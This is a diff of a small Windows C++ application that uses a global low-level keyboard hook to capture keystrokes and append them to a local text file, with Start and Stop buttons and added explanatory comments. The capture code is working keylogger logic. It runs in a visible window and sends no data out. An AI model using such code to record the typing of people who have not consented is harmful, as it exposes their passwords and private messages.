@@ -1,9 +1,36 @@
-﻿#include "framework.h"
-#include "KB_Hook.h"
-#include <stdio.h>
-#include <string>
-#include <fstream>
-#include <locale>
+﻿#include "KB_Hook.h"
+
+/*
+  *
+  *
+  * This code is a simple Windows application that uses a global low-level keyboard hook to intercept and write keystrokes to a file.
+  * Here is a brief explanation of the main parts of the code:
+  *
+  * In the `KbHookProcLL` function, the hooked keyboard messages are processed. When the user presses a key,
+  * information about the press is passed to this function via the `nCode`, `wParam` and `lParam` parameters.
+  *
+  * Inside `KbHookProcLL`, information about the pressed key and its character representation is retrieved. 
+  * Then the character is written to the `buf` array.
+  *
+  * Then an instance of the `std::ofstream` class is created with the path to the file to which the data will be written (`C:\\...\\...\\...\\CAPTURED.txt`).
+  * Flag ` std::ios_base::app` indicates that the data will be appended to the end of the file.
+  *
+  * If the file could not be opened, an error message is displayed in the application window.
+  *
+  * Then the character from the `buf` array is written to the file using the `< < ` operator. The `std::locale::global`
+  * function is used to set the global locale, which may be needed to correctly write characters to a file in some cases.
+  *
+  * After writing the character to the file, the file is closed.
+  *
+  * At the end of the `KbHookProcLL` function, the `CallNextHookEx` function is called to transfer control to the next hook in the chain.
+  *
+  * In the `StartKbHookLL` and `StopKbHookLL` functions, the global keyboard hook is started and stopped using the `
+  * SetWindowsHookEx` and `UnhookWindowsHookEx` functions, respectively.
+  *
+  * The `WndProc` function handles messages related to window creation, buttons, and other interface elements.
+  *
+  *
+*/
 
 #define MAX_LOADSTRING 100
 #define CMD_KB_LL_START 1001
@@ -12,9 +39,9 @@
 HINSTANCE hInst;
 WCHAR szTitle[MAX_LOADSTRING];
 WCHAR szWindowClass[MAX_LOADSTRING];
+WCHAR txt[100];
 HWND list;
 HHOOK kbLL;
-WCHAR txt[100];
 
 ATOM MyRegisterClass(HINSTANCE hInstance);
 BOOL InitInstance(HINSTANCE, int);
@@ -25,7 +52,8 @@ DWORD CALLBACK StopKbHookLL(LPVOID);
 LRESULT CALLBACK KbHookProcLL(int, WPARAM, LPARAM);
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
-{
+{    // Initializes the application, processes messages from the queue, and exits when a WM_QUIT message is received. 
+    // It also loads application resources and uses accelerators to process keyboard shortcuts.
     UNREFERENCED_PARAMETER(hPrevInstance);
     UNREFERENCED_PARAMETER(lpCmdLine);
     LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
@@ -50,8 +78,8 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
     return (int)msg.wParam;
 }
 
-ATOM MyRegisterClass(HINSTANCE hInstance)
-{
+ATOM MyRegisterClass(HINSTANCE hInstance)  // Registering a window class, defining its style, window procedure,
+{                                         // icons, cursor, background, and other attributes.
     WNDCLASSEXW wcex;
 
     wcex.cbSize = sizeof(WNDCLASSEX);
@@ -68,14 +96,15 @@ ATOM MyRegisterClass(HINSTANCE hInstance)
     wcex.lpszClassName = szWindowClass;
     wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));
 
+
     return RegisterClassExW(&wcex);
 }
 
-BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
-{
+BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)  // Сreates and displays the application window, and performs the necessary updates and
+{                                                    // checks to correctly initialize the instance.
     hInst = hInstance;
 
-    HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);
+    HWND hWnd = CreateWindowExW(0, szWindowClass, szTitle, WS_OVERLAPPEDWINDOW & ~WS_SIZEBOX, 100, 100, 400, 500, nullptr, nullptr, hInstance, nullptr);
 
     if (!hWnd)
         return FALSE;
@@ -86,17 +115,39 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
     return TRUE;
 }
 
-LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
+LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)  // Handles various messages.
 {
     switch (message)
     {
     case WM_CREATE:
-        list = CreateWindowW(L"Listbox", L"", WS_VISIBLE | WS_CHILD | WS_BORDER | WS_VSCROLL, 100, 10, 200, 300, hWnd, 0, hInst, NULL);
-        kbLL = 0;
+    {
+        RECT clientRect;
 
-        CreateWindowW(L"Button", L"LL Start", WS_VISIBLE | WS_CHILD, 10, 20, 75, 23, hWnd, (HMENU)CMD_KB_LL_START, hInst, NULL);
-        CreateWindowW(L"Button", L"LL Stop", WS_VISIBLE | WS_CHILD, 10, 50, 75, 23, hWnd, (HMENU)CMD_KB_LL_STOP, hInst, NULL);
+        GetClientRect(hWnd, &clientRect);
+        
+        int clientWidth = clientRect.right - clientRect.left;
+        int clientHeight = clientRect.bottom - clientRect.top;
+        int listBoxWidth = 200;
+        int listBoxHeight = 300;
+        int listBoxX = (clientWidth - listBoxWidth) / 2;
+        int listBoxY = (clientHeight - listBoxHeight - 50) / 2;
+
+        list = CreateWindowW(L"Listbox", L"", WS_VISIBLE | WS_CHILD | WS_BORDER | WS_VSCROLL, listBoxX, listBoxY, listBoxWidth, listBoxHeight, hWnd, 0, hInst, NULL);
+
+        int buttonWidth = listBoxWidth;
+        int buttonHeight = 23;
+        int buttonX = listBoxX;
+        int buttonY = listBoxY + listBoxHeight + 10;
+
+        CreateWindowW(L"Button", L"LL Start", WS_VISIBLE | WS_CHILD, buttonX, buttonY, buttonWidth, buttonHeight, hWnd, (HMENU)CMD_KB_LL_START, hInst, NULL);
+        
+        buttonY += buttonHeight + 5;
+        
+        CreateWindowW(L"Button", L"LL Stop", WS_VISIBLE | WS_CHILD, buttonX, buttonY, buttonWidth, buttonHeight, hWnd, (HMENU)CMD_KB_LL_STOP, hInst, NULL);
+
+        kbLL = 0;
         break;
+    }
     case WM_COMMAND:
     {
         int wmId = LOWORD(wParam);
@@ -137,9 +188,9 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
     return 0;
 }
 
-INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
-{
-    UNREFERENCED_PARAMETER(lParam);
+INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)  // Represents the "About" dialog box handler function that handles messages 
+{                                                                             // associated with a dialog box. If the message does not match any of the above, 
+    UNREFERENCED_PARAMETER(lParam);                                          // FALSE is returned to indicate that the message was not processed by the dialog box handler.
 
     switch (message)
     {
@@ -156,8 +207,8 @@ INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
     return (INT_PTR)FALSE;
 }
 
-DWORD CALLBACK StartKbHookLL(LPVOID param)
-{
+DWORD CALLBACK StartKbHookLL(LPVOID param)  // The function is used to set and activate the interception 
+{                                          // of low-level keyboard events and display information about the activation state in the listbox.
     if (kbLL != 0)
         _snwprintf_s(txt, 100, L"KB LL works");
     else
@@ -172,8 +223,8 @@ DWORD CALLBACK StartKbHookLL(LPVOID param)
     return 0;
 }
 
-DWORD CALLBACK StopKbHookLL(LPVOID param)
-{
+DWORD CALLBACK StopKbHookLL(LPVOID param)  // The function is used to disable the global procedure for intercepting 
+{                                         // low-level keyboard events and displaying information about the connection state in the listbox.
     if (kbLL != 0)
     {
         UnhookWindowsHookEx(kbLL);
@@ -189,9 +240,9 @@ DWORD CALLBACK StopKbHookLL(LPVOID param)
     return 0;
 }
 
-LRESULT CALLBACK KbHookProcLL(int nCode, WPARAM wParam, LPARAM lParam)
-{
-    std::ofstream file("C:\\Users\\scrin\\Desktop\\KB_Hook\\KB_Hook\\CAPTURED.txt", std::ios_base::app);
+LRESULT CALLBACK KbHookProcLL(int nCode, WPARAM wParam, LPARAM lParam)  // In general, this function intercepts keyboard keystrokes, writes information about them to a 
+{                                                                      // file, and displays the information in a listbox.
+    std::ofstream file("C:\\KB_Hook\\KB_Hook\\CAPTURED.txt", std::ios_base::app);  // <-- Paste your path where the file is located here.
     static char buf[100];
 
     if (!file.is_open())
@@ -210,9 +261,9 @@ LRESULT CALLBACK KbHookProcLL(int nCode, WPARAM wParam, LPARAM lParam)
             buf[std::strlen(buf)] = static_cast<char>(sym);
             buf[std::strlen(buf) + 1] = '\0';
 
-            std::locale::global(std::locale("")); // Установка глобальной локали
+            std::locale::global(std::locale(""));
 
-            file << buf << std::endl; // Запись данных в файл
+            file << buf << std::endl;
         }
     }
 
